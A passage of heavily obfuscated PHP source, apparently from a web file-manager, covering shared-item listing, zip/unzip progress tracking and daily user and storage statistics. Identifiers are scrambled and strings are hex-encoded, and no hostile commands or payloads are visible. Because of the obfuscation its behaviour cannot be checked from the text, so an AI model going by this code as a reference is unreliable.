$ÔòüÌ´[541]); $éöÕÇ«ò = array_to_keyvalue($•ôŠÀæ, $ÔòüÌ´[12], $ÔòüÌ´[543]); $ú—€ñ“È = array_merge($‡âËşüà, $éöÕÇ«ò); $Öò¨Œå = Model($ÔòüÌ´[617])->userListInfo($ú—€ñ“È); foreach ($•ôŠÀæ as &$ËÂÊ¿æí) { $´åıëê = $ËÂÊ¿æí[$ÔòüÌ´[541]]; $ËÂÊ¿æí[$ÔòüÌ´[541]] = $Öò¨Œå[$´åıëê] ? $Öò¨Œå[$´åıëê] : !1; $´åıëê = $ËÂÊ¿æí[$ÔòüÌ´[543]]; $ËÂÊ¿æí[$ÔòüÌ´[543]] = $Öò¨Œå[$´åıëê] ? $Öò¨Œå[$´åıëê] : !1; if (_get($ËÂÊ¿æí, $ÔòüÌ´[629], 0)) { $ŒÀş¸¶ = $GLOBALS[$ÔòüÌ´[6]][$ÔòüÌ´[92]][$ÔòüÌ´[630]]; if ($ËÂÊ¿æí[$ÔòüÌ´[555]][$ÔòüÌ´[631]] <= time() - $ŒÀş¸¶) { $this->metaSet($ËÂÊ¿æí[$ÔòüÌ´[191]], $ÔòüÌ´[632], null); $this->metaSet($ËÂÊ¿æí[$ÔòüÌ´[191]], $ÔòüÌ´[631], null); unset($ËÂÊ¿æí[$ÔòüÌ´[555]][$ÔòüÌ´[632]]); continue; } $Ã©æ«ˆ = $ËÂÊ¿æí[$ÔòüÌ´[555]][$ÔòüÌ´[632]]; $ËÂÊ¿æí[$ÔòüÌ´[555]][$ÔòüÌ´[633]] = Model($ÔòüÌ´[617])->getInfoSimpleOuter($Ã©æ«ˆ); } } unset($ËÂÊ¿æí); } public function parentLevelArray($Ü‘‘¼Ë¡) { $Ù¬ƒ÷Ì =& $_SERVER[µÅ˜º…æ]; $Ü‘‘¼Ë¡ = explode($Ù¬ƒ÷Ì[50], trim($Ü‘‘¼Ë¡, $Ù¬ƒ÷Ì[50])); return array_to_int(array_filter($Ü‘‘¼Ë¡)); } public function listAll($ƒ—«Õª¥) { $ œ§ÏÑ™ =& $_SERVER[µÅ˜º…æ]; $Š¯Õá’î = $this->sourceInfo($ƒ—«Õª¥); $ñşŠÒ®µ = array($ œ§ÏÑ™[634] => array($ œ§ÏÑ™[635], $Š¯Õá’î[$ œ§ÏÑ™[604]] . $ƒ—«Õª¥ . $ œ§ÏÑ™[636]), $ œ§ÏÑ™[637] => 0); $¦œÀè©Å = $ œ§ÏÑ™[638]; $öÍ½«ºÕ = "\114\105\x46\x54\x20\112\117\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\x66\x69\154\145\40\146\151\x6c\145\40\157\156\40\163\x6f\x75\x72\x63\145\x2e\x66\151\154\x65\x49\104\x20\75\40\146\151\x6c\145\56\146\151\154\x65\x49\x44"; $Î¿ˆëê = $this->alias($ œ§ÏÑ™[533])->field($¦œÀè©Å)->where($ñşŠÒ®µ)->join($öÍ½«ºÕ)->select(); $this->_listAppendAuth($Î¿ˆëê); $this->_listAppendUser($Î¿ˆëê); $this->_listAppendPath($Î¿ˆëê); $Î¿ˆëê = array_to_keyvalue($Î¿ˆëê, $ œ§ÏÑ™[191]); $·Ÿó¼ã = "\57{$Š¯Õá’î[$ œ§ÏÑ™[32]]}\x2f"; $·Ÿó¼ã = $·Ÿó¼ã == $ œ§ÏÑ™[254] ? $ œ§ÏÑ™[8] : $·Ÿó¼ã; $Ã“¢Ï¨ş = array(); foreach ($Î¿ˆëê as $š”Ïªñ => $ÙáÁ˜Öš) { $ÚÔÆˆ‹Ç = $this->parentLevelArray($ÙáÁ˜Öš[$ œ§ÏÑ™[604]]); array_shift($ÚÔÆˆ‹Ç); $×¼ª¦¦ = $·Ÿó¼ã; for ($¿Óê¿½é = 0; $¿Óê¿½é < count($ÚÔÆˆ‹Ç); $¿Óê¿½é++) { $×¼ª¦¦ .= $Î¿ˆëê[$ÚÔÆˆ‹Ç[$¿Óê¿½é]][$ œ§ÏÑ™[32]] . $ œ§ÏÑ™[8]; } $×¼ª¦¦ .= $ÙáÁ˜Öš[$ œ§ÏÑ™[32]]; if ($ÙáÁ˜Öš[$ œ§ÏÑ™[500]]) { $×¼ª¦¦ .= $ œ§ÏÑ™[8]; } $Ğªİı­Å = array($ œ§ÏÑ™[510] => str_replace($ œ§ÏÑ™[254], $ œ§ÏÑ™[8], str_replace($ œ§ÏÑ™[254], $ œ§ÏÑ™[8], str_replace($ œ§ÏÑ™[254], $ œ§ÏÑ™[8], $×¼ª¦¦))), $ œ§ÏÑ™[639] => intval($ÙáÁ˜Öš[$ œ§ÏÑ™[500]]), $ œ§ÏÑ™[640] => intval($ÙáÁ˜Öš[$ œ§ÏÑ™[79]]), $ œ§ÏÑ™[88] => intval($ÙáÁ˜Öš[$ œ§ÏÑ™[88]]), $ œ§ÏÑ™[90] => $this->pathInfoFilter($ÙáÁ˜Öš)); if (!$Ğªİı­Å[$ œ§ÏÑ™[500]]) { $Ğªİı­Å[$ œ§ÏÑ™[557]] = $ÙáÁ˜Öš[$ œ§ÏÑ™[557]]; } $Ã“¢Ï¨ş[] = $Ğªİı­Å; } $Ã“¢Ï¨ş = array_sort_by($Ã“¢Ï¨ş, $ œ§ÏÑ™[87]); return $Ã“¢Ï¨ş; } } goto F‡‚ùÓğÖÃ; A¦ğØá´ÙÇ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¤æ¶Â =& $_SERVER[µÅ˜º…æ]; parent::startAfter(); Hook::bind($¤æ¶Â[2099], array($this, $¤æ¶Â[2100])); Hook::bind($¤æ¶Â[1385], array($this, $¤æ¶Â[2101])); Hook::bind($¤æ¶Â[2102], array($this, $¤æ¶Â[2103])); $–åèÂ¥Õ =& $this->task; $–åèÂ¥Õ[$¤æ¶Â[2104]] = $¤æ¶Â[1386]; if (!$–åèÂ¥Õ[$¤æ¶Â[1865]]) { $–åèÂ¥Õ[$¤æ¶Â[1865]] = LNG($¤æ¶Â[2105]); } } protected function endAfter() { $â¬Ø Ï÷ =& $_SERVER[µÅ˜º…æ]; parent::endAfter(); Hook::unbind($â¬Ø Ï÷[2099], array($this, $â¬Ø Ï÷[2100])); Hook::unbind($â¬Ø Ï÷[1385], array($this, $â¬Ø Ï÷[2101])); Hook::unbind($â¬Ø Ï÷[2102], array($this, $â¬Ø Ï÷[2103])); } public function updateAfter() { $€ºµä‰¢ =& $_SERVER[µÅ˜º…æ]; $›®’†óß =& $this->task; if (!$›®’†óß[$€ºµä‰¢[1233]] || !$›®’†óß[$€ºµä‰¢[863]]) { if ($›®’†óß[$€ºµä‰¢[2104]] != $€ºµä‰¢[388]) { return; } } if ($›®’†óß[$€ºµä‰¢[2104]] == $€ºµä‰¢[1386]) { $ƒşß×ıí = 0; if ($›®’†óß[$€ºµä‰¢[2029]]) { $ƒşß×ıí = $›®’†óß[$€ºµä‰¢[2030]] / $›®’†óß[$€ºµä‰¢[2029]]; } $›®’†óß[$€ºµä‰¢[1977]] = $ƒşß×ıí * 0.3; } else { if ($›®’†óß[$€ºµä‰¢[2104]] == $€ºµä‰¢[388]) { $ƒşß×ıí = $›®’†óß[$€ºµä‰¢[1976]] / $›®’†óß[$€ºµä‰¢[1233]]; $›®’†óß[$€ºµä‰¢[1977]] = 0.3 + $ƒşß×ıí * 0.4; } else { if ($›®’†óß[$€ºµä‰¢[2104]] == $€ºµä‰¢[107]) { $»›øøğà = 0; if ($›®’†óß[$€ºµä‰¢[2031]] == $€ºµä‰¢[107]) { $»›øøğà = $›®’†óß[$€ºµä‰¢[2030]]; } $ƒşß×ıí = ($›®’†óß[$€ºµä‰¢[940]] + $»›øøğà) / $›®’†óß[$€ºµä‰¢[863]]; $›®’†óß[$€ºµä‰¢[1977]] = 0.3 + 0.4 + $ƒşß×ıí * 0.3; } } } if ($›®’†óß[$€ºµä‰¢[1977]] > 0) { $·ÈçêÔ— = timeFloat() - $›®’†óß[$€ºµä‰¢[1979]] - $›®’†óß[$€ºµä‰¢[1982]]; $›®’†óß[$€ºµä‰¢[1983]] = $·ÈçêÔ— * (1 - $›®’†óß[$€ºµä‰¢[1977]]) / $›®’†óß[$€ºµä‰¢[1977]]; } } public function addFile($À¼÷± ò) { $ñáŒ¨ª° =& $_SERVER[µÅ˜º…æ]; $ÔëØÓğ¾ =& $this->task; $Ãî É† = IO::info($À¼÷± ò); $ÔëØÓğ¾[$ñáŒ¨ª°[2027]] = $Ãî É†[$ñáŒ¨ª°[32]]; $ÔëØÓğ¾[$ñáŒ¨ª°[2029]] = $Ãî É†[$ñáŒ¨ª°[79]]; $ÔëØÓğ¾[$ñáŒ¨ª°[2030]] = 0; $ÔëØÓğ¾[$ñáŒ¨ª°[1235]] = $ñáŒ¨ª°[2057]; $ÔëØÓğ¾[$ñáŒ¨ª°[2031]] = $ñáŒ¨ª°[1386]; $ÔëØÓğ¾[$ñáŒ¨ª°[863]] = $Ãî É†[$ñáŒ¨ª°[79]]; $ÔëØÓğ¾[$ñáŒ¨ª°[1233]] = 1; $âøÒËº = 0; $ÔëØÓğ¾[$ñáŒ¨ª°[2039]] = array($ñáŒ¨ª°[2040] => $âøÒËº + 1, $ñáŒ¨ª°[509] => $Ãî É†[$ñáŒ¨ª°[32]], $ñáŒ¨ª°[87] => $Ãî É†[$ñáŒ¨ª°[87]], $ñáŒ¨ª°[602] => $Ãî É†[$ñáŒ¨ª°[602]] ? $Ãî É†[$ñáŒ¨ª°[602]] : $Ãî É†[$ñáŒ¨ª°[87]]); $this->update(); } public function zipEvent($˜Ë×¦…ë, $™ßÚ§Ì, $­Ì‚î—’, $Ä¤ò—§É) { $Óû½èÄ =& $_SERVER[µÅ˜º…æ]; $è»½ï¾Å =& $this->task; $è»½ï¾Å[$Óû½èÄ[2027]] = get_path_this($™ßÚ§Ì); $è»½ï¾Å[$Óû½èÄ[2029]] = $Ä¤ò—§É; $è»½ï¾Å[$Óû½èÄ[2030]] = $­Ì‚î—’; $è»½ï¾Å[$Óû½èÄ[1235]] = $˜Ë×¦…ë == $Óû½èÄ[2106] ? $Óû½èÄ[2107] : $Óû½èÄ[2108]; $è»½ï¾Å[$Óû½èÄ[2031]] = $Óû½èÄ[12]; $è»½ï¾Å[$Óû½èÄ[863]] = $Ä¤ò—§É; $è»½ï¾Å[$Óû½èÄ[2104]] = $Óû½èÄ[388]; $this->update(); } public function unzipAfter($„•ªª§­) { $¹ÙÙâ„ç =& $_SERVER[µÅ˜º…æ]; $éÉô¸ä´ =& $this->task; $éÉô¸ä´[$¹ÙÙâ„ç[2104]] = $¹ÙÙâ„ç[107]; $ÖÜé‡×é = IO::infoWithChildren($„•ªª§­); $¤÷ï¶ê = 0; $éÉô¸ä´[$¹ÙÙâ„ç[2039]] = array($¹ÙÙâ„ç[2040] => $¤÷ï¶ê + 1, $¹ÙÙâ„ç[509] => $ÖÜé‡×é[$¹ÙÙâ„ç[32]], $¹ÙÙâ„ç[87] => $ÖÜé‡×é[$¹ÙÙâ„ç[87]], $¹ÙÙâ„ç[602] => $ÖÜé‡×é[$¹ÙÙâ„ç[602]] ? $ÖÜé‡×é[$¹ÙÙâ„ç[602]] : $ÖÜé‡×é[$¹ÙÙâ„ç[87]]); if ($ÖÜé‡×é[$¹ÙÙâ„ç[33]] == $¹ÙÙâ„ç[230]) { $éÉô¸ä´[$¹ÙÙâ„ç[1233]] = 1; } else { $éÉô¸ä´[$¹ÙÙâ„ç[1233]] = $ÖÜé‡×é[$¹ÙÙâ„ç[82]][$¹ÙÙâ„ç[80]]; } $éÉô¸ä´[$¹ÙÙâ„ç[1235]] = $¹ÙÙâ„ç[12]; $éÉô¸ä´[$¹ÙÙâ„ç[2031]] = 0; $éÉô¸ä´[$¹ÙÙâ„ç[1976]] = 0; $éÉô¸ä´[$¹ÙÙâ„ç[2029]] = 0; $éÉô¸ä´[$¹ÙÙâ„ç[2030]] = 0; $éÉô¸ä´[$¹ÙÙâ„ç[2027]] = $¹ÙÙâ„ç[12]; $éÉô¸ä´[$¹ÙÙâ„ç[940]] = 0; $éÉô¸ä´[$¹ÙÙâ„ç[863]] = $ÖÜé‡×é[$¹ÙÙâ„ç[79]]; $this->update(); self::log($¹ÙÙâ„ç[2109] . json_encode(array($éÉô¸ä´, $ÖÜé‡×é))); } public function nameParse($ã»˜‚ÂÜ) { $º•ğ¹¢à =& $_SERVER[µÅ˜º…æ]; $¾ÀÙúı‹ =& $this->task; if ($¾ÀÙúı‹[$º•ğ¹¢à[2104]] == $º•ğ¹¢à[1386]) { $¾ÀÙúı‹[$º•ğ¹¢à[2104]] = $º•ğ¹¢à[388]; $¾ÀÙúı‹[$º•ğ¹¢à[940]] = 0; $¾ÀÙúı‹[$º•ğ¹¢à[863]] = 0; } $öÜ’©ù = get_path_this($ã»˜‚ÂÜ); if (strstr($öÜ’©ù, $º•ğ¹¢à[10])) { $¾ÀÙúı‹[$º•ğ¹¢à[1976]] += 1; $¾ÀÙúı‹[$º•ğ¹¢à[1233]] += 1; } $¾ÀÙúı‹[$º•ğ¹¢à[2027]] = $ã»˜‚ÂÜ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $¸úØ¶—í =& $_SERVER[µÅ˜º…æ]; parent::startAfter(); Hook::bind($¸úØ¶—í[2110], array($this, $¸úØ¶—í[2100])); Hook::bind($¸úØ¶—í[2102], array($this, $¸úØ¶—í[2103])); $ÛÇä»× =& $this->task; $ÛÇä»×[$¸úØ¶—í[2104]] = $¸úØ¶—í[1386]; if (!$ÛÇä»×[$¸úØ¶—í[1865]]) { $ÛÇä»×[$¸úØ¶—í[1865]] = LNG($¸úØ¶—í[2111]); } } protected function endAfter() { $¶›ğøÇ• =& $_SERVER[µÅ˜º…æ]; parent::endAfter(); Hook::unbind($¶›ğøÇ•[2110], array($this, $¶›ğøÇ•[2100])); Hook::unbind($¶›ğøÇ•[2102], array($this, $¶›ğøÇ•[2103])); } public function updateAfter() { $¹îùò =& $_SERVER[µÅ˜º…æ]; $ïî±ø¾Ø =& $this->task; if (!$ïî±ø¾Ø[$¹îùò[1233]] || !$ïî±ø¾Ø[$¹îùò[863]]) { return; } if ($ïî±ø¾Ø[$¹îùò[2104]] == $¹îùò[1386]) { $¤Îóõš« = $ïî±ø¾Ø[$¹îùò[2030]]; if ($ïî±ø¾Ø[$¹îùò[2031]] != $¹îùò[1386]) { $¤Îóõš« = 0; } $ñ˜È‹òÍ = ($ïî±ø¾Ø[$¹îùò[940]] + $¤Îóõš«) / $ïî±ø¾Ø[$¹îùò[863]]; $ïî±ø¾Ø[$¹îùò[1977]] = $ñ˜È‹òÍ * 0.3; } else { if ($ïî±ø¾Ø[$¹îùò[2104]] == $¹îùò[388]) { $ñ˜È‹òÍ = $ïî±ø¾Ø[$¹îùò[1976]] / $ïî±ø¾Ø[$¹îùò[1233]]; $ïî±ø¾Ø[$¹îùò[1977]] = 0.3 + $ñ˜È‹òÍ * 0.5; } else { if ($ïî±ø¾Ø[$¹îùò[2104]] == $¹îùò[107]) { $ñ˜È‹òÍ = 0; if ($ïî±ø¾Ø[$¹îùò[2029]]) { $ñ˜È‹òÍ = $ïî±ø¾Ø[$¹îùò[2030]] / $ïî±ø¾Ø[$¹îùò[2029]]; } $ïî±ø¾Ø[$¹îùò[1977]] = 0.3 + 0.5 + $ñ˜È‹òÍ * 0.2; } } } if ($ïî±ø¾Ø[$¹îùò[1977]] > 0) { $°Õò¼¸× = timeFloat() - $ïî±ø¾Ø[$¹îùò[1979]] - $ïî±ø¾Ø[$¹îùò[1982]]; $ïî±ø¾Ø[$¹îùò[1983]] = $°Õò¼¸× * (1 - $ïî±ø¾Ø[$¹îùò[1977]]) / $ïî±ø¾Ø[$¹îùò[1977]]; } } public function copyFileStart($õÔÄªæ, $‰ËÂĞ¼­, $’ŠÎË˜ä, $ñäÜğüî, $²í„±Àö, $â£Á¸ì) { $ÙœñÊ¿œ =& $_SERVER[µÅ˜º…æ]; parent::copyFileStart($õÔÄªæ, $‰ËÂĞ¼­, $’ŠÎË˜ä, $ñäÜğüî, $²í„±Àö, $â£Á¸ì); $Œ¥Şë´ƒ =& $this->task; if ($Œ¥Şë´ƒ[$ÙœñÊ¿œ[2104]] == $ÙœñÊ¿œ[388]) { $Œ¥Şë´ƒ[$ÙœñÊ¿œ[2104]] = $ÙœñÊ¿œ[107]; } $this->update(); } public function copyFileEnd($¾â¦¯„š, $š—éÑ§, $¸€›Ï‡Æ, $áÚƒÈ¤, $ë¶Õåšë, $üÂÂµß´) { $Ş÷û³±Ñ =& $_SERVER[µÅ˜º…æ]; $¯Úîîı =& $this->task; $¯Úîîı[$Ş÷û³±Ñ[2030]] = $¯Úîîı[$Ş÷û³±Ñ[2029]]; $¯Úîîı[$Ş÷û³±Ñ[940]] += $¯Úîîı[$Ş÷û³±Ñ[2029]]; $¯Úîîı[$Ş÷û³±Ñ[2031]] = $Ş÷û³±Ñ[12]; $this->update(); } public function zipEvent($Ê«‘°±¾, $ûº»“±Ì, $ø¹ÎµŠ, $ÌÒêÊ”) { $®á­æ =& $_SERVER[µÅ˜º…æ]; $ÀäÂ¼ÙÑ =& $this->task; $ÀäÂ¼ÙÑ[$®á­æ[2027]] = get_path_this($ûº»“±Ì); $ÀäÂ¼ÙÑ[$®á­æ[2029]] = $ÌÒêÊ”; $ÀäÂ¼ÙÑ[$®á­æ[2030]] = $ø¹ÎµŠ; $ÀäÂ¼ÙÑ[$®á­æ[1235]] = $Ê«‘°±¾ == $®á­æ[2112] ? $®á­æ[2107] : $®á­æ[2108]; $ÀäÂ¼ÙÑ[$®á­æ[2031]] = $®á­æ[12]; $ÀäÂ¼ÙÑ[$®á­æ[863]] = $ÌÒêÊ”; $ÀäÂ¼ÙÑ[$®á­æ[2104]] = $®á­æ[388]; $this->update(); } public function nameParse($ÀÌµ¨) { $ü­Ÿ™¢ø =& $_SERVER[µÅ˜º…æ]; $ÖÙİïÄá =& $this->task; if ($ÖÙİïÄá[$ü­Ÿ™¢ø[1976]] < $ÖÙİïÄá[$ü­Ÿ™¢ø[1233]]) { $µÔ‚“¶ = get_path_this($ÀÌµ¨); if (strstr($µÔ‚“¶, $ü­Ÿ™¢ø[10])) { $ÖÙİïÄá[$ü­Ÿ™¢ø[1976]] += 1; } } if ($ÖÙİïÄá[$ü­Ÿ™¢ø[2104]] == $ü­Ÿ™¢ø[1386]) { $ÖÙİïÄá[$ü­Ÿ™¢ø[2104]] = $ü­Ÿ™¢ø[388]; } $ÖÙİïÄá[$ü­Ÿ™¢ø[2027]] = $ÀÌµ¨; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¦ıêÕú) { $ÁÌ‡Ì«¬ =& $_SERVER[µÅ˜º…æ]; $™§Öıí÷ = array($ÁÌ‡Ì«¬[684] => array($ÁÌ‡Ì«¬[33] => $ÁÌ‡Ì«¬[2113], $ÁÌ‡Ì«¬[351] => array($ÁÌ‡Ì«¬[282], $ÁÌ‡Ì«¬[865], $ÁÌ‡Ì«¬[2114], $ÁÌ‡Ì«¬[2115])), $ÁÌ‡Ì«¬[2116] => array($ÁÌ‡Ì«¬[33] => $ÁÌ‡Ì«¬[2117], $ÁÌ‡Ì«¬[351] => array($ÁÌ‡Ì«¬[282], $ÁÌ‡Ì«¬[863], $ÁÌ‡Ì«¬[2118], $ÁÌ‡Ì«¬[2119], $ÁÌ‡Ì«¬[2120]))); if (!isset($™§Öıí÷[$¦ıêÕú])) { return !1; } $this->optionType = $™§Öıí÷[$¦ıêÕú][$ÁÌ‡Ì«¬[33]]; $this->field = $™§Öıí÷[$¦ıêÕú][$ÁÌ‡Ì«¬[351]]; return !0; } public function listData($Ë“Èü« = false, $í‚¡—ÕÔ = "\155\157\144\151\146\171\x54\151\x6d\x65", $ºŠÄúß = false) { return parent::listData($Ë“Èü«, $í‚¡—ÕÔ, $ºŠÄúß); } public function trendList($àã©ïÏ) { $¥›üİÂ¿ =& $_SERVER[µÅ˜º…æ]; $ùëÄŒ§© = $this->listData(); if ($ùëÄŒ§©) { $ãÓô†õ³ = end($ùëÄŒ§©); $ûèçÏÆí = date($¥›üİÂ¿[2121], strtotime($¥›üİÂ¿[2122])); if ($ãÓô†õ³[$¥›üİÂ¿[282]] == $ûèçÏÆí) { return $ùëÄŒ§©; } $ÔÍ™˜ìÕ = strtotime($ãÓô†õ³[$¥›üİÂ¿[282]]); } if (!isset($ÔÍ™˜ìÕ)) { $ı«Êü‡§ = $àã©ïÏ == $¥›üİÂ¿[684] ? $¥›üİÂ¿[617] : $¥›üİÂ¿[932]; $ÔÍ™˜ìÕ = Model($ı«Êü‡§)->min($¥›üİÂ¿[231]); } $–ØË–ş = $¥›üİÂ¿[2123] . ucfirst($àã©ïÏ); $Ğ»³óñÕ = $this->dateList($ÔÍ™˜ìÕ); foreach ($Ğ»³óñÕ as $ûèçÏÆí) { $this->{$–ØË–ş}($ûèçÏÆí); } return $this->listData(); } private function dateList($¾æôÍÂ) { $¬ß›€™² =& $_SERVER[µÅ˜º…æ]; $ëŒö—ï³ = $¾æôÍÂ; $ôë¢Òª = strtotime($¬ß›€™²[2122]); $ÀñÈ—´º = array(); while ($ëŒö—ï³ <= $ôë¢Òª) { $ÀñÈ—´º[] = date($¬ß›€™²[2121], $ëŒö—ï³); $ëŒö—ï³ = strtotime($¬ß›€™²[2124], $ëŒö—ï³); } return $ÀñÈ—´º; } public function _recordUser($Ò°¶ªóş = '') { $§ÉÃõŒĞ =& $_SERVER[µÅ˜º…æ]; if (!$Ò°¶ªóş) { return 0; } $ÊË©¬™‰ = strtotime(date($§ÉÃõŒĞ[2125], strtotime($Ò°¶ªóş))); $àÊ…È‘å = strtotime(date($§ÉÃõŒĞ[2126], strtotime($Ò°¶ªóş))); $‚İªÉ = array($§ÉÃõŒĞ[231] => array($§ÉÃõŒĞ[1182], $àÊ…È‘å)); $’£øÇ²© = Model($§ÉÃõŒĞ[617])->where($‚İªÉ)->count($§ÉÃõŒĞ[1593]); $‚İªÉ[$§ÉÃõŒĞ[231]] = array($§ÉÃõŒĞ[408], array($ÊË©¬™‰, $àÊ…È‘å)); $ËÄ¨‹ïù = Model($§ÉÃõŒĞ[617])->where($‚İªÉ)->count($§ÉÃõŒĞ[1593]); $‚İªÉ[$§ÉÃõŒĞ[33]] = $§ÉÃõŒĞ[2127]; $»ŞËµ­Ÿ = Model($§ÉÃõŒĞ[2128])->where($‚İªÉ)->count($§ÉÃõŒĞ[2129]); $è„ÎÜú = array($§ÉÃõŒĞ[282] => $Ò°¶ªóş, $§ÉÃõŒĞ[865] => (int) $’£øÇ²©, $§ÉÃõŒĞ[2114] => (int) $ËÄ¨‹ïù, $§ÉÃõŒĞ[2115] => (int) $»ŞËµ­Ÿ); return $this->insert($è„ÎÜú); } public function _recordStore($ış®ô†÷ = '') { $Ù™¶®Ñ® =& $_SERVER[µÅ˜º…æ]; if (!$ış®ô†÷) { return 0; } $¢ßÄÕ—± = strtotime(date($Ù™¶®Ñ®[2126], strtotime($ış®ô†÷))); $ÇÁ¨ÁÕ¢ = array($Ù™¶®Ñ®[231] => array($Ù™¶®Ñ®[1182], $¢ßÄÕ—±)); $ûÂóÅØ¾ = Model($Ù™¶®Ñ®[560])->where($ÇÁ¨ÁÕ¢)->sum($Ù™¶®Ñ®[79]); $¼şñÉ«„ = "\123\105\114\x45\x43\124\40\12\x20\40\40\x20\40\x20\x20\40\40\40\x20\x20\40\40\x20\40\x53\125\115\x28\x60\163\151\x7a\145\140\51\40\x41\x53\40\163\x69\x7a\145\x54\157\x74\141\x6c\54\12\40\x20\x20\40\40\40\40\40\40\40\x20\40\40\x20\x20\x20\x53\125\115\50\x43\101\123\x45\40\x57\110\105\x4e\x20\x60\x74\141\x72\x67\x65\164\124\x79\160\145\140\40\75\40\x31\40\124\110\x45\116\40\x60\163\x69\172\x65\140\x20\x45\114\123\105\x20\60\40\105\116\104\x29\40\x41\123\x20\x73\151\x7a\x65\x55\163\145\162\x2c\12\x20\x20\40\40\x20\40\40\x20\40\x20\x20\40\40\x20\x20\x20\123\x55\x4d\x28\x43\x41\123\x45\x20\127\110\x45\116\x20\140\164\141\x72\x67\145\x74\124\171\160\x65\140\x20\75\x20\62\x20\x54\x48\x45\116\40\x60\x73\151\x7a\145\140\40\x45\114\123\105\40\x30\x20\105\x4e\104\x29\40\101\123\x20\x73\151\x7a\x65\x47\x72\157\165\160\xa\x20\x20\x20\40\40\40\40\x20\x20\40\40\x20\x20\x20\x20\40\106\x52\x4f\x4d\40\x60\151\157\137\x73\157\165\162\143\x65\x60\x20\12\x20\x20\x20\x20\40\40\x20\x20\x20\40\x20\40\40\x20\40\40\x57\110\x45\122\105\x20\x60\151\x73\106\157\x6c\144\x65\x72\140\x20\x3d\40\x30\40\x41\116\104\x20\140\x63\162\x65\x61\x74\x65\124\x69\155\145\140\40\74\x3d\40{$¢ßÄÕ—±}"; $¥¶†ıÍÅ = Model($Ù™¶®Ñ®[932])->query($¼şñÉ«„); $‡„—º»û = array($Ù™¶®Ñ®[282] => $ış®ô†÷, $Ù™¶®Ñ®[863] => (int) (isset($¥¶†ıÍÅ[0][$Ù™¶®Ñ®[863]]) ? $¥¶†ıÍÅ[0][$Ù™¶®Ñ®[863]] : 0), $Ù™¶®Ñ®[2118] => (int) $ûÂóÅØ¾, $Ù™¶®Ñ®[2119] => (int) (isset($¥¶†ıÍÅ[0][$Ù™¶®Ñ®[2119]]) ? $¥¶†ıÍÅ[0][$Ù™¶®Ñ®[2119]] : 0), $Ù™¶®Ñ®[2120] => (int) (isset($¥¶†ıÍÅ[0][$Ù™¶®Ñ®[2120]]) ? $¥¶†ıÍÅ[0][$Ù™¶®Ñ®[2120]] : 0)); return $this->insert($‡„—º»û); } public function trend($µ—Ú²Î¾, $èÀåŠôÅ) { $³íç÷¼Ù =& $_SERVER[µÅ˜º…æ]; if (!$this->init($µ—Ú²Î¾)) { return !1; } $Ëéñ·ü = $this->trendList($µ—Ú²Î¾); if ($Ëéñ·ü && $èÀåŠôÅ != $³íç÷¼Ù[1949]) { $‡ª“¹ø© = $Ëéñ·ü[0][$³íç÷¼Ù[282]]; $®¨ÙÖÂó = $this->validDate($èÀåŠôÅ, $‡ª“¹ø©); $Ê´Œû‡ = array(); $¶’¿óÔì = array_to_keyvalue($Ëéñ·ü, $³íç÷¼Ù[282]); foreach ($®¨ÙÖÂó as $£ò½›ïª) { if (isset($¶’¿óÔì[$£ò½›ïª])) { $­Ñşî—Æ = $¶’¿óÔì[$£ò½›ïª]; } else { $­Ñşî—Æ = end($Ëéñ·ü); $­Ñşî—Æ[$³íç÷¼Ù[282]] = $£ò½›ïª; if ($µ—Ú²Î¾ == $³íç÷¼Ù[684]) { $­Ñşî—Æ[$³íç÷¼Ù[2114]] = $­Ñşî—Æ[$³íç÷¼Ù[2115]] = 0; } } $Ê´Œû‡[] = $­Ñşî—Æ; } $Ëéñ·ü = $Ê´Œû‡; } $µ¡”éš = array($³íç÷¼Ù[684] => array($³íç÷¼Ù[865] => LNG($³íç÷¼Ù[2130]), $³íç÷¼Ù[2114] => LNG($³íç÷¼Ù[2131]), $³íç÷¼Ù[2115] => LNG($³íç÷¼Ù[2132])), $³íç÷¼Ù[2116] => array($³íç÷¼Ù[863] => LNG($³íç÷¼Ù[2133]), $³íç÷¼Ù[2118] => LNG($³íç÷¼Ù[2134]), $³íç÷¼Ù[2119] => LNG($³íç÷¼Ù[2135]), $³íç÷¼Ù[2120] => LNG($³íç÷¼Ù[2136]))); $ã‰«¹ÉÇ = array($³íç÷¼Ù[684] => $³íç÷¼Ù[949], $³íç÷¼Ù[2116] => $³íç÷¼Ù[79]); if (empty($Ëéñ·ü)) { $£ò½›ïª = date($³íç÷¼Ù[2121], strtotime($³íç÷¼Ù[2122])); $ÚÉ“†‘ = array($³íç÷¼Ù[282] => $£ò½›ïª); foreach ($µ¡”éš[$µ—Ú²Î¾] as $èÉùš³Ô => $¡„ğĞİó) { $ÚÉ“†‘[$èÉùš³Ô] = 0; } $Ëéñ·ü[] = $ÚÉ“†‘; } $“Ù¨£å = array(); foreach ($Ëéñ·ü as $¡„ğĞİó) { if ($µ—Ú²Î¾ == $³íç÷¼Ù[2116] && $¡„ğĞİó[$³íç÷¼Ù[2118]] > $¡„ğĞİó[$³íç÷¼Ù[863]]) { $¡„ğĞİó[$³íç÷¼Ù[2118]] = $¡„ğĞİó[$³íç÷¼Ù[863]]; } foreach ($µ¡”éš[$µ—Ú²Î¾] as $èÉùš³Ô => $ ß¯¶åÏ) { $­Ñşî—Æ = array($³íç÷¼Ù[282] => $¡„ğĞİó[$³íç÷¼Ù[282]], $³íç÷¼Ù[1865] => $ ß¯¶åÏ); $­Ñşî—Æ[$ã‰«¹ÉÇ[$µ—Ú²Î¾]] = isset($¡„ğĞİó[$èÉùš³Ô]) ? $¡„ğĞİó[$èÉùš³Ô] : 0; $“Ù¨£å[] = $­Ñşî—Æ; } } return $“Ù¨£å; } public function validDate($³À§´ˆ, $ ÓèĞá¾) { $š§ùæ =& $_SERVER[µÅ˜º…æ]; $©à‚£¾û = date($š§ùæ[2121], strtotime($š§ùæ[2122])); $ÇæÍ³Á = array($©à‚£¾û); switch ($³À§´ˆ) { case $š§ùæ[1956]: $«ƒ‡úòÀ = mktime(0, 0, 0, date($š§ùæ[2137]), date($š§ùæ[1660]) - date($š§ùæ[1746]) + 7 - 7, date($š§ùæ[2138])); $®¥Ì¢»Ÿ = 0; do { $¨Í±³ğ¬ = date($š§ùæ[2121], $«ƒ‡úòÀ - 3600 * 24 * 7 * $®¥Ì¢»Ÿ); $ÇæÍ³Á[] = $¨Í±³ğ¬; $®¥Ì¢»Ÿ++; } while ($ ÓèĞá¾ < $¨Í±³ğ¬); break; case 